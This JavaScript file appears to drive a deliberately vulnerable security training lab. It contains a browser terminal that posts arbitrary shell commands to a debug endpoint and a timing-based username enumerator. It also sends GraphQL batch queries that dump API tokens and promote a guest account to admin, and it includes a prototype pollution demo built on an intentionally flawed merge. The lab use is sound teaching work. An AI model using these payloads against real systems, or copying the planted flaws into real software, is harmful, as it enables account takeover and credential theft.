// LawCypenLab v20 :: terminal emulator, timing attack, GraphQL, proto pollution

// ── Terminal Emulator ─────────────────────────────────────────────────
(function () {
  const inp = document.getElementById('term-input');
  const out = document.getElementById('term-output');
  if (!inp || !out) return;

  const history = [];
  let histIdx = -1;

  function appendLine(cls, text) {
    const line = document.createElement('div');
    line.className = cls || '';
    line.textContent = text;
    out.appendChild(line);
    out.scrollTop = out.scrollHeight;
  }

  inp.addEventListener('keydown', async e => {
    if (e.key === 'ArrowUp') {
      if (histIdx < history.length - 1) histIdx++;
      inp.value = history[history.length - 1 - histIdx] || '';
      return;
    }
    if (e.key === 'ArrowDown') {
      if (histIdx > 0) histIdx--;
      inp.value = history[history.length - 1 - histIdx] || '';
      return;
    }
    if (e.key !== 'Enter') return;
    const cmd = inp.value.trim();
    if (!cmd) return;
    history.push(cmd);
    histIdx = -1;
    inp.value = '';

    appendLine('prompt', `root@aegis:~# ${cmd}`);

    // local built-in commands
    if (cmd === 'clear') { out.innerHTML = ''; return; }
    if (cmd === 'help') {
      ['Available commands:', '  id, whoami, hostname, pwd, ls, env', '  cat <file>, exec <cmd>', '  clear, help'].forEach(l => appendLine('dim', l));
      return;
    }

    // send to server
    try {
      const r = await fetch('/debug-terminal/exec', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'cmd=' + encodeURIComponent(cmd)
      });
      const d = await r.json();
      if (d.stdout) d.stdout.split('\n').forEach(l => appendLine('', l));
      if (d.stderr) d.stderr.split('\n').filter(Boolean).forEach(l => appendLine('error', l));
      if (d.error) appendLine('error', d.error);
    } catch (ex) {
      appendLine('error', 'Connection error: ' + ex.message);
    }
  });
})();

// ── Timing Attack Visualizer ─────────────────────────────────────────
async function runTimingAttack() {
  const users = ['admin', 'r.solis', 'nonexistent_user_xyz', 'guest'];
  const out = document.getElementById('timing-out');
  if (out) { out.innerHTML = ''; out.style.display = 'block'; }
  for (const u of users) {
    const t0 = performance.now();
    await fetch('/api/timing/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'username=' + encodeURIComponent(u) + '&password=wrongpassword'
    });
    const ms = Math.round(performance.now() - t0);
    if (out) {
      const row = document.createElement('div');
      row.className = 'timing-row';
      const maxMs = 400;
      const exists = ms > 150; // heuristic based on the deliberate sleep
      row.innerHTML = `
        <span class="timing-label">${u}</span>
        <div class="timing-track"><div class="timing-fill ${exists?'exists':'missing'}" style="width:${Math.min(100,ms/maxMs*100)}%"></div></div>
        <span class="timing-ms">${ms} ms</span>
        <span style="font-size:10px;color:${exists?'#FF5C5C':'#4FD8E0'}">${exists?'EXISTS':'NOT FOUND'}</span>`;
      out.appendChild(row);
    }
  }
}

// ── GraphQL Playground ────────────────────────────────────────────────
async function runGql() {
  const query = document.getElementById('gql-query')?.value || '';
  const out = document.getElementById('gql-out');
  if (out) { out.style.display = 'block'; out.textContent = 'Sending…'; }
  try {
    const r = await fetch('/api/v5/graphql', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query })
    });
    if (out) out.textContent = `HTTP ${r.status}\n\n` + JSON.stringify(await r.json(), null, 2);
  } catch (e) {
    if (out) out.textContent = 'Error: ' + e.message;
  }
}

async function runGqlBatch() {
  const out = document.getElementById('gql-batch-out');
  if (out) { out.style.display = 'block'; out.textContent = 'Sending batch…'; }
  const batch = [
    { query: '{ __schema { types { name } } }' },
    { query: '{ crew { username email role apiToken } }' },
    { query: 'mutation { updateRole(username:"guest", role:"admin") { username role } }' }
  ];
  try {
    const r = await fetch('/api/v5/graphql', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(batch)
    });
    if (out) out.textContent = `HTTP ${r.status}\n\n` + JSON.stringify(await r.json(), null, 2);
  } catch (e) {
    if (out) out.textContent = 'Error: ' + e.message;
  }
}

// ── Prototype Pollution Demo ──────────────────────────────────────────
function runProtoPollution() {
  const out = document.getElementById('proto-out');
  if (!out) return;
  out.style.display = 'block';

  const config = {};
  const lines = [];

  lines.push('// before pollution:');
  lines.push(`config.role = ${JSON.stringify(config.role)} (undefined)`);
  lines.push(`{}.role = ${JSON.stringify({}.role)} (undefined)`);
  lines.push('');

  // Simulate a recursive merge with attacker-supplied JSON
  const attackerPayload = JSON.parse('{"__proto__":{"role":"admin","isAdmin":true}}');
  function merge(target, src) {
    for (const k of Object.keys(src)) {
      if (k === '__proto__') {
        Object.assign(Object.prototype, src[k]); // VULN: pollutes Object.prototype
      } else if (typeof src[k] === 'object') {
        target[k] = target[k] || {};
        merge(target[k], src[k]);
      } else {
        target[k] = src[k];
      }
    }
  }
  merge(config, attackerPayload);

  lines.push('// attacker payload merged: {"__proto__":{"role":"admin","isAdmin":true}}');
  lines.push('');
  lines.push('// after pollution:');
  lines.push(`config.role = ${JSON.stringify(config.role)}`);
  lines.push(`{}.role = ${JSON.stringify({}.role)}  // ← all objects affected!`);
  lines.push(`new Object().isAdmin = ${JSON.stringify(new Object().isAdmin)}`);
  lines.push('');
  lines.push('// Impact: any server-side check "if (options.role)" now sees "admin"');
  lines.push('//         even on freshly-created objects with no explicit role property.');

  out.textContent = lines.join('\n');
}
